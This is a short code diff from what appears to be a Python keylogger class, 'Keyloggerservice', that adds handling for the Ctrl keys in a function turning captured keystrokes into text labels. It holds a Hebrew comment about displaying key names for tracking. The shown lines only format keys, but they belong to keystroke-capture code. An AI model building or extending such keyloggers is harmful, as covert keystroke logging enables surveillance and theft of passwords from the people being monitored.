@@ -38,6 +38,8 @@ class Keyloggerservice(Ikeylogger):
             return '[BACKSPACE]'
         elif key == keyboard.Key.shift:
             return ''
+        elif key == keyboard.Key.ctrl_r or key == keyboard.Key.ctrl_l:
+            return '<ctl>'
         else:
             return f'[{key}]'  # תציג את שם המקש למעקב
 
